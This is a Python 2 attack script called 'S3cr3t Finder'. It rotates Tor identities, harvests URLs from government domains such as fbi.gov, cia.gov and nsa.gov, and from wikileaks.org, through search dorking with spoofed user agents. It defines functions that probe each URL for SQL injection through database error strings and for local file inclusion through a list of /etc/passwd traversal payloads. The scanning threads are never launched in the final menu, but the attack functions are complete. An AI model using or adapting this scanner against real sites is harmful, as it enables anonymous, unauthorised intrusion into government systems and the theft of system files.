#!/usr/bin/python

import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
from bs4 import BeautifulSoup
import requests
from termcolor import colored, cprint
from datetime import datetime
from stem import Signal
from stem.control import Controller

with Controller.from_port(port = 9051) as c:
    c.authenticate()
    c.signal(Signal.NEWNYM)

from random import choice

# Colours
W  = "\033[0m";
R  = "\033[31m";
G  = "\033[32m";
O  = "\033[33m";
B  = "\033[34m";


# Banner
def logo():
  print ''
  cprint('-------------------------------', 'green',attrs=['bold'])
  print colored('[+]', 'red'), colored('S3cr3t Finder  V1.0', 'red')
  print colored('[+]', 'red'), colored('....Find anything!.....', 'green')
  cprint('-------------------------------', 'green',attrs=['bold'])
  print R+"\n|---------------------------------------------------------------------------------------------------|"
  print "|@@@((( .# *@&&.  #@@@*#&&@.,*  (/@@@(/.  #    % /@@@.   *@@@& (  *,%@@@*  @@@@.#  % ,@&&,.&&&( (&&%|"
  print "| %  (( .# *,      .&  #  #.,*  (  %  (.  #    % (/      *, .& (  *, ./     ,/ .#  % ,%   .% .( (.  |"
  print "| %  (@&  *&%       &  #@@@ ,*  (  %  /&&&&    % ,@@@.   *, .% (  *, .(     ,/ .@&&@ ,@&. .&@@( (&( |"
  print "| %  (( .# *,      .&  # #* ,*  (  %  /.  #    % ,. *,   *, .% (  ,, .(     ,/ .#  % ,%   .%.%  (.  |"
  print "| %  (( .# *@@@,   .&  #  @..@@@/  %  /.  #    % (@@@.   *@@@% /@@@. .(     ,/ .#  % ,@@@*.% *# (@@&|"
  print "|                                                                                                   |"
  print "|---------------------------------------------------------------------------------------------------|\n"
  print W

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()

else:
  subprocess.call("cls", shell=True)
  logo()

log = "info1.txt"
logfile = open(log, "a")
lfi_log = "info2-lfi.txt"
lfi_log_file = open(lfi_log, "a")
threads = []
finallist = []
vuln = []
timeout = 300
socket.setdefaulttimeout(timeout)




lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]


sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}


header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']


domains = {'ALL GOV DOMAINS':['gov'],
           'FBI':['fbi.gov'],
           'CIA':['cia.gov'],
           'NSA':['nsa.gov'],
           'NASA':['nasa.gov'],
           'WIKILEAKS':['wikileaks.org']}


stecnt = 0
for k,v in domains.items():
  stecnt += 1
  print str(stecnt)+" - "+k
sitekey = raw_input("\nChoose your target   : ")
sitearray = domains[domains.keys()[int(sitekey)-1]]


inurl = raw_input('\nEnter your Search     : ')
numthreads = raw_input('Enter no. of threads : ')
maxc = raw_input('Enter no. of pages   : ')
print ""
print "Number of headers    :",len(header)
print "Number of domains    :",len(v)
print "Number of threads    :",numthreads
print "Number of pages      :",maxc
print "Timeout in seconds   :",timeout
print ""




def search(inurl, maxc):
  urls = []
  for site in sitearray:
    page = 0
    try:
      while page < int(maxc):
	jar = cookielib.FileCookieJar("cookies")
	query = inurl+"+site:"+site
	results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
	request_web =urllib2.Request(results_web)
	agent = random.choice(header)
	request_web.add_header('User-Agent', agent)
	opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	text = opener_web.open(request_web).read()
	stringreg = re.compile('(?<=href=")(.*?)(?=")')
        names = stringreg.findall(text)
        page += 1
        for name in names:
	  if name not in urls:
	    if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	      pass
	    elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name):
	      pass
	    else:
	      urls.append(name)
	percent = int((1.0*page/int(maxc))*100)
	urls_len = len(urls)
	sys.stdout.write("\rSite: %s | Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
	sys.stdout.flush()
    except(KeyboardInterrupt):
      pass
  tmplist = []
  print "\n\n[+] URLS (found): "
  print (urls)
  print "\n\n[+] URLS (unsorted): ",len(urls)
  for url in urls:
    try:
      host = url.split("/",3)
      domain = host[2]
      if domain not in tmplist and "=" in url:
        finallist.append(url)
        tmplist.append(domain)

    except:
      pass
      print "[+] URLS (sorted)  : ",len(finallist)
      return finallist


class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False


def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in sqlerrors.items():
                        if re.search(eMSG, source):
                                print R+"\nw00t!,w00t!:", O+host, B+"Error:", type
				logfile.write("\n"+host)
				vuln.append(host)


                        else:
                                pass
        except:
                pass


def ClassicLFI(url):
  lfiurl = url.rsplit('=', 1)[0]
  if lfiurl[-1] != "=":
    lfiurl = lfiurl + "="
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print R+"\nw00t!,w00t!: ", O+lfiurl+lfi
	lfi_log_file.write("\n"+lfiurl+lfi)
	vuln.append(lfiurl+lfi)
	break
    except:
      pass




usearch = search(inurl,maxc)
menu = True
while menu == True:
  print "[4] Save valid urls to file"
  print "[5] Print valid urls"
  print "[0] Exit\n"
  chce = raw_input(":")


  if chce == '4':
    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
    listname = raw_input("Filename: ")
    list_name = open(listname, "w")
    finallist.sort()
    for t in finallist:
      list_name.write(t+"\n")
    list_name.close()
    print "Urls saved, please check", listname

  if chce == '5':
    print W+"\nPrinting valid urls:\n"
    finallist.sort()
    for t in finallist:
      print B+t

  if chce == '0':
    print R+"\n[-] Exiting ..."
    mnu = False
    sys.exit(1)
